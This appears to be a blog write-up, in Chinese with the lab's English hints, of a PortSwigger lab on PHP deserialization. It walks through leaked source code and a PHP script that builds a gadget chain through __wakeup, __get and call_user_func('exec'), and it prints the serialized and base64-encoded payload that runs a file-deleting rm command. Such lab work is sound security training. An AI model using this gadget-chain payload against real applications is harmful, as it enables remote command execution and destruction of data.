---
layout: post
title: "Developing a custom gadget chain for PHP deserialization"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---





# Developing a custom gadget chain for PHP deserialization
```
 In the source code, notice that the __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate.



Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes call_user_func(), which will execute any function that is passed into it via the DefaultMap->callback attribute. The function will be executed on the $name, which is the non-existent attribute that was requested. 



 You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where:
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"



If you follow the data flow in the source code, you will notice that this causes the Product constructor to try and fetch the default_desc_type from the DefaultMap object. As it doesn't have this attribute, the __get() method will invoke the callback exec() method on the default_desc_type, which is set to our shell command. 


To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie: 

//////////////////////////////////////////////////////////////////////////////////

在源代碼中，請注意 CustomTemplate 的 __wakeup() 魔術方法將通過引用來自 CustomTemplate 的 default_desc_type 和 desc 創建一個新產品。



另請注意，DefaultMap 類具有 __get() 魔術方法，如果您嘗試讀取此對像不存在的屬性，則會調用該方法。這個神奇的方法調用 call_user_func()，它將執行通過 DefaultMap->callback 屬性傳遞給它的任何函數。該函數將在 $name 上執行，這是所請求的不存在的屬性。



 您可以通過傳入一個 CustomTemplate 對象來利用此小工具鏈來調用 exec(rm /home/carlos/morale.txt)，其中：
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"



如果您遵循源代碼中的數據流，您會注意到這會導致 Product 構造函數嘗試從 DefaultMap 對像中獲取 default_desc_type。由於它沒有這個屬性，__get() 方法將調用 default_desc_type 上的回調 exec() 方法，該方法設置為我們的 shell 命令。


為了解決實驗室問題，Base64 和 URL 編碼以下序列化對象，並通過會話 cookie 將其傳遞到網站：


`wiener:peter`
```

login -> 抓包

```http
GET /my-account HTTP/1.1
Host: 0a7b00d404a14954c0924845001d00c1.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJmYzhhYXloamU0Mzd6eGJocGhkOTlpczFzdTU5MDVsMSI7fQ%3d%3d
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0a7b00d404a14954c0924845001d00c1.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close


```

unserialize
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"fc8aayhje437zxbhphd99is1su5905l1";}

```


/cgi-bin/libs/CustomTemplate.php~ 拿到 備份 source 

以下有詳細解釋請搭配官方的說明。
簡單來講 先從少的開始看。然後推敲整個邏輯。
其實漏洞主要還是因為有了__wakeup()  它讓我們竄改的數據可以被執行。

關鍵:
```
//__get() 函數 
https://devindeving.blogspot.com/2020/12/php-magic-method-get-set-and-laravel.html

//call_user_func() 函數
https://php.golaravel.com/function.call-user-func.html
```

竄改主要發生在 CustomTemplate 類別 

```php

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;





    public function __construct($desc_type='HTML_DESC') {


    	//des 是一個 Description 物件
    	//竄改為 一個 DefaultMap(exec)物件
        $this->desc = new Description();

        // default_desc_type 是一個 字串 "HTML_DESC"
        //竄改為 一個字串 "rm /home/carlos/morale.txt"
        $this->default_desc_type = $desc_type;

        //呼叫方法 build_product()
        $this->build_product();
    }





    // 看起來沒用
    public function __sleep() {
        return ["default_desc_type", "desc"];
    }






    public function __wakeup() {

    	////呼叫方法 build_product()
        $this->build_product();
    }





    private function build_product() {

    	//product 是一個 Product 物件 

    	// 參數1.default_desc_type 是一個 字串 "HTML_DESC" ,  被竄改為 "rm /home/carlos/morale.txt"

    	// 參數2.desc 是一個 Description 物件 被竄改為 DefaultMap 物件

        $this->product = new Product($this->default_desc_type, $this->desc);
    }




}








class Product {
    public $desc;



   
    public function __construct($default_desc_type, $desc) {

    	//$desc = Description -> HTML_DESC 
    	//也就是 '<p>This product is <blink>SUPER</blink> cool in html</p>'

    	//$desc = DefaultMap -> rm /home/carlos/morale.txt

        $this->desc = $desc->$default_desc_type;
    }
}






class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
    	//給string
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}









class DefaultMap {

    private $callback;


    //給callback 值 類似 DefaultMap(exec)
    // $callback = exec 
    public function __construct($callback) {
        $this->callback = $callback;
    }

	

    // 存取不到或沒權限時就拿那個名子
    //竄改後會 DefaultMap -> 'rm /home/carlos/morale.txt'
    //$name = " rm /home/carlos/morale.txt"
    public function __get($name) {
		
    	
        // exec('rm /home/carlos/morale.txt')
        return call_user_func($this->callback, $name);
    }
}


?>
```


如果你到這邊已經了解來龍去脈的話。可以開始構造惡意的序列化數據。

只需要修改CustomTemplate

$this->desc = new DefaultMap(exec);
$this->default_desc_type = "rm /home/carlos/morale.txt";

然後把它們序列化打印出來~~~

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;





    public function __construct($desc_type='HTML_DESC') {


        //des 是一個 Description 物件
        //竄改為 一個 DefaultMap物件
        $this->desc = new DefaultMap(exec);

        // default_desc_type 是一個 字串 "HTML_DESC"
        //竄改為 一個字串 
        $this->default_desc_type = "rm /home/carlos/morale.txt";

        //呼叫方法 build_product()
        $this->build_product();
    }





    // 看起來沒用
    public function __sleep() {
        return ["default_desc_type", "desc"];
    }






    public function __wakeup() {

    	////呼叫方法 build_product()
        $this->build_product();
    }





    private function build_product() {

    	//product 是一個 Product 物件 

    	// 參數1.default_desc_type 是一個 字串 "HTML_DESC" ,  被竄改為 "rm /home/carlos/morale.txt"

    	// 參數2.desc 是一個 Description 物件 被竄改為 DefaultMap 物件

        $this->product = new Product($this->default_desc_type, $this->desc);
    }




}








class Product {
    public $desc;



   
    public function __construct($default_desc_type, $desc) {

    	//$desc = Description -> HTML_DESC 
    	//也就是 '<p>This product is <blink>SUPER</blink> cool in html</p>'

    	//$desc = DefaultMap -> rm /home/carlos/morale.txt

        $this->desc = $desc->$default_desc_type;
    }
}






class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
    	//給string
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}









class DefaultMap {

    private $callback;


    //給callback 值 類似 DefaultMap(exec)
    // $callback = exec 
    public function __construct($callback) {
        $this->callback = $callback;
    }

	

    // 存取不到或沒權限時就拿那個名子
    //竄改後會 DefaultMap -> 'rm /home/carlos/morale.txt'
    //$name = " rm /home/carlos/morale.txt"
    public function __get($name) {
		
    	
        // exec('rm /home/carlos/morale.txt')
        return call_user_func($this->callback, $name);
    }
}



$my = new CustomTemplate;
$data= serialize($my);
var_dump($data);

?>

```

結果:
```
string(190) "O:14:"CustomTemplate":2:{s:33:"CustomTemplatedefault_desc_type";s:26:"rm /home/carlos/morale.txt";s:20:"CustomTemplatedesc";O:10:"DefaultMap":1:{s:20:"DefaultMapcallback";s:4:"exec";}}"

```

這個結果我不確定為啥 CustomTemplate 物件名  一直重複出現在各個屬性的開頭，把它去掉，然後字數調整即可， DefaultMap 也要 

```
"O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}"
```

去掉前後雙引號:
```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

base64 encode :
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319
```




主要還是考你能不能白盒，帥就一個字。